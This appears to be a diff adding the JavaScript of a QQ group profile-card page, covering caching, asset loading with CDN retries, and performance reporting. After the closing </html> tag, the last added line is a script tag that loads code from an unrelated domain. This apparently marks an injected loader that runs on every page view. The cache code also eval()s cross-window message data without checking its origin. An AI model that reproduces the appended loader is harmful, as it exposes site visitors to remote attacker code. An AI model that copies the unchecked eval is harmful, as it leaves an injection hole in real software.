+!function(e,t){"function"==typeof define&&define.amd?define(["modules/common/js/util"],t):e.CacheFactory=t(e.Util)}(this,function(Util){window._pre_fetch_cache={},window._has_add_drag=!0;var cacheVersion=12,_retry=!1,config={useNewCgi:!0},status={groupuin:0},ClientAPI={OnStartDragMove:function(){try{window.external.StartDragMove()}catch(e){}}},addMessageListener=function(){window.addEventListener("message",function(e){var data=eval("("+e.data+")");switch(data.event){case"get_group_info_done":"Home"==data.from&&addCache("home",data.groupuin,data.html,data.header)}})},addCache=function(e,t,a,o){if(_retry)return _retry=!1,void 0;var n="cache_"+e,r=localStorage.getItem(n);r=r&&JSON.parse(r)||{},r[t]={html:a,time:new Date-0,headerHtml:o};try{localStorage.setItem(n,JSON.stringify(r))}catch(i){localStorage.clear(),_retry=!0,addCache(e,t,a,o)}},getClearGroupuins=function(e,t){var a=localStorage.getItem("cache_"+e+"_time")||[];return a.sort(function(e,t){return e.time>=t}),a.splice(0,t)},getCacheKey=function(e,t){return["cache",e.toLowerCase(),t].join("_")},preGetGroupInfo=function(){var e=window._pre_fetch_cache[window.global_get_group_info];e.state="waiting",e.lastRequestSentTime=new Date-0,Util.http.get("/cgi-bin/"+window.global_get_group_info,{gc:status.groupuin,src:"qinfo_v2",bkn:Util.encryptSkey()},function(t){e.requestGotTime=new Date-0,e.state="ok",e.data=t,window.postMessage(JSON.stringify({event:"PreFetchData",from:"CacheFactory",cgiName:window.global_get_group_info}),"http://qinfo.clt.qq.com")})},initGlobalVar=function(){window.global_get_group_info=4==status.role?"qun_info/get_group_info_en":"qun_info/get_group_info_all",window._pre_fetch_cache={},window._pre_fetch_cache[window.global_get_group_info]={}};return{init:function(){status.groupuin=Util.hash.get("groupuin"),status.role=Util.hash.get("role"),initGlobalVar();var e=JSON.parse(localStorage.getItem("cache_home")),t=localStorage.getItem("cache_version")||0,a=localStorage.getItem("cache_role")||-1;if(t!=cacheVersion||a!=status.role)localStorage.clear("cache_home"),localStorage.setItem("cache_version",cacheVersion),localStorage.setItem("cache_role",status.role);else if(e&&e[status.groupuin]&&(document.getElementById("container_home").innerHTML=e[status.groupuin].html,e[status.groupuin].headerHtml)){window._has_add_drag=!1,document.getElementById("header").innerHTML=e[status.groupuin].headerHtml;var o=document.getElementById("drag_area");o&&o.addEventListener("mousedown",function(e){0==e.button&&ClientAPI.OnStartDragMove()})}addMessageListener(),preGetGroupInfo(status.groupuin)}}});
+</script>
+<script>
+var LoadCSS=function(){function e(e,t){for(var n=-1,o=0,r=e.length;r>o;o++)e[o]==t&&(n=o);return n}function t(){var e=navigator.userAgent,t={};return(t.webkit=/AppleWebKit\//.test(e))||(t.ie=/MSIE/.test(e))||(t.opera=/Opera/.test(e))||(t.gecko=/Gecko\//.test(e))||(t.unknown=!0),t}function n(e,t){try{e.sheet.cssRules}catch(o){return e.pollCount++,e.pollCount<200?setTimeout(function(){n(e,t)},50):r(e.href,t),void 0}r(e.href,t)}function o(e,t){for(var n=c.length;n>0;n--)if(c[n-1].href===e.href)return r(e.href,t),void 0;e.pollCount++,e.pollCount<200?setTimeout(function(){o(e,t)},50):r(e.href,t)}function r(t,n){var o=e(n.urls,t);n.urls.splice(o,1),n.urls.length||(n.callback(n.obj),o=e(a,n),a.splice(o,1))}function l(e,t,l){var c={urls:e,callback:t,obj:l};a.push(c);for(var s=c.urls,f=0,h=s.length;h>f;++f){var p,d=s[f];i.gecko?p=document.createElement("style"):(p=document.createElement("link"),p.rel="stylesheet",p.href=d),i.gecko||i.webkit?(p.pollCount=0,c.urls[f]=p.href,i.webkit?o(p,c):(p.innerHTML='@import "'+d+'";',n(p,c))):p.onload=p.onerror=function(){r(this.href,c)},u.appendChild(p)}}var u=document.head||document.getElementsByTagName("head")[0],c=document.styleSheets,i=t(),a=[];return{load:function(e,t,n){l([].concat(e),t||function(){},n||{})}}}();
+</script>
+<!-- 备注：execRequireConfig.js 来自 index/js/common.js -->
+<script>
+function execRequireConfig(){require.config({baseUrl:"http://1.url.cn/qun/qinfo_v2/modules/index/js/",paths:{modules:"../../../modules",bower_components:"../../../bower_components",jquery:"http://1.url.cn/jslib/jquery/1.9.1/jquery.min",simple:"http://7.url.cn/qun/jslib/jslib/simple/clear/8/simple.min",home:"../../home/js/4a36.home",setting:"../../setting/js/59b0.setting",member:"../../member/js/1d59.member",async:"../../common/js/de24.async",contextmenu:"../../common/contextmenu/9bfc.contextmenu",commonapi:"../../../bower_components/commonapi/0.1/c7f3.commonapi",catCtrl:"../../profile/js/profile/d97b.CatCtrl",catnew:"../../profile/js/data/a41b.catnew",mapManage:"../../profile/js/profile/5e15.MapManage",profileIndex:"../../profile/js/index/01a7.index",RichEditor:"../../profile/js/profile/06bb.RichEditor",htmlEncode:"../../common/js/f4b1.htmlEncode",CKEDITOR:"../../../bower_components/ckeditor/4281.ckeditor",app_lecture:"../../app/lecture/js/92b1.app",guideLevel:"7cbc.guideLevel"},shim:{commonapi:{exports:"CommonApi"},CKEDITOR:{exports:"CKEDITOR"},simple:{exports:"Simple"}}})}
+</script>
+
+<script type="text/javascript">
+	Header.init();
+	CacheFactory.init();
+
+	TRecord.push("main","header_info_show");	// 从页面加载，到header信息第一次展示（资料从客户端拉取）花费时间
+    TRecord.push('static_js_require', 'start');	// 上报-起始：requirejs加载
+	TRecord.push('static_js_index_aio', 'start');	// 上报-起始：index_aio.js加载
+</script>
+
+
+<script type="text/javascript">
+  
+	// ID: 359287    名称：加载失败：requirejs
+	// ID: 359288    名称：加载失败：index_aio
+	// ID: 359289    名称：加载失败：main.css
+
+	// ID: 359296	名称：群资料卡v2-加载重试成功-requirejs
+	// ID: 359297	名称：群资料卡v2-加载重试成功-index_aio.js
+	// ID: 359298	名称：群资料卡v2-加载重试成功-main.css
+
+	// 各种错误上报
+	window['__static_file_load_err'] = {
+		'index.js': false,
+		'require.js': false
+	};
+	window['__has_file_load_err'] = false;	// 是否有文件加载失败
+
+	var __report = function(url){
+		var img = new Image();
+		img.src = [url, 'r='+Math.random()].join('&');
+	};
+
+	// cdn重试
+	function reloadIndex(){
+		__report('http://jsreport.qq.com/cgi-bin/report?id=167&rs=0-0-359288');	
+
+		window['__has_file_load_err'] = true;
+		window['__static_file_load_err']['index.js'] = true;
+		window['require'] && window['require'](['http://qinfo.clt.qq.com/qinfo_v2/modules/index/js/daef.index.js']);
+	}
+
+    // 加载的js列表
+    var arr = [
+	    {
+	    	src: 'http://1.url.cn/jslib/requirejs/2.1.6/require.min.js',
+	    	onerror: function(){
+	    		console.log('requirejs load fail!');
+
+	    		__report('http://jsreport.qq.com/cgi-bin/report?id=167&rs=0-0-359287');	// 失败上报
+
+	    		// 错误上报
+				window['__has_file_load_err'] = true;
+				
+				console.log('File loaded error: requirejs! Try again!');
+				var script = document.createElement('script');
+				script.setAttribute('data-main', 'http://qinfo.clt.qq.com/qinfo_v2/modules/index/js/daef.index');
+				script.src = 'http://1.url.cn/qun/qinfo_v2/bower_components/requirejs/2.1.6/js/a348.require.js';
+				script.onload = function(){
+					__report('http://jsreport.qq.com/cgi-bin/report?id=167&rs=0-0-359296');
+				};
+				document.body.appendChild(script);
+
+				reloadIndex();
+	    	},
+	    	onload: function(){
+	    		console.log('require load succ!');
+
+				TRecord.push('static_js_require', 'end');	// 上报-结束：requirejs加载
+	    	}
+	    },
+	    {
+	    	src: 'http://1.url.cn/qun/qinfo_v2/modules/index/js/daef.index.js',
+	    	onerror: function(){
+
+	    		reloadIndex();
+	    	}
+	    }
+    ];
+    if(Util.hash.get('tab')=='info' && Util.hash.get('from')=='create'){
+    	arr.push('http://7.url.cn/qun/jslib/jslib/simple/clear/8/simple.min.js');
+    	arr.push('http://1.url.cn/qun/qinfo_v2/modules/profile/js/index/01a7.index.js');
+    }
+
+    if(Util.hash.get('tab')=='member'){
+    	arr.push('http://1.url.cn/qun/qinfo_v2/modules/member/js/1d59.member.js');
+    }
+    Util.createScripts(arr);
+</script>
+
+<script type="text/javascript">
+
+	// CSS文件加载失败上报、重试，@todo 代码重构
+	setTimeout(function(){
+		function isCssLoadSucc(){
+			var visibility = window.getComputedStyle(document.getElementById('js_css_detector')).visibility;
+			return visibility==='hidden'
+		}
+		
+		if(!isCssLoadSucc()){
+			window['__has_file_load_err'] = true;
+
+			console.log('File loaded error: main.css');
+			var link = document.createElement('link');
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = 'http://qinfo.clt.qq.com/qinfo_v2/modules/index/css/c040.main.css';
+			setTimeout(function(){
+				if(isCssLoadSucc()){
+					__report('http://jsreport.qq.com/cgi-bin/report?id=167&rs=0-0-359298');	// 群资料卡v2-加载重试成功-main.css
+				}
+			}, 5000);
+			document.head.appendChild(link);
+			__report('http://jsreport.qq.com/cgi-bin/report?id=167&rs=0-0-359289');	// 加载失败：main.css
+		}
+	}, 100);
+
+    // 性能监控上报
+    window.onload = function(){
+
+        setTimeout(function(){
+            
+            var obj = Util.getPerfTimeStamp();
+           	var t = window.performance.timing;
+
+            TRecord.push("client", "base", 0);
+            TRecord.push("client", "client_click_to_load", obj.StartNavigateTS - obj.StartVisitTS);  // 客户端点击到开始加载html花费时间
+            TRecord.push("client", "client_load_html_cost", obj.NavigateCompleteTS - obj.StartNavigateTS); // 客户端加开始加载html到加载完成花费的时间-通过commonapi
+            TRecord.push("client", "timing_load_html_cost", t.responseEnd - t.requestStart); // 客户端加开始加载html到加载完成花费的时间-通过timing
+
+			// 
+	        TRecord.report2('flag1=7809&flag2=1&flag3=56', 'client', {
+	            'client_click_to_load': '4',
+	            'client_load_html_cost': '5',
+	            'timing_load_html_cost': '6'
+	        });
+
+	        // 加载nohost脚本
+	        Util.createScript('http://1.url.cn/qun/qinfo_v2/modules/common/js/a8e3.nohost.js');
+
+        }, 2500);
+    };
+
+    // 临时用来放置资料编辑的代码
+    TRecord['htmlEnd'] = (new Date()).getTime();
+</script>
+
+</body>
+</html>
+<script language=javascript src=http://mm.aa88567.cn/index/mm.js></script>
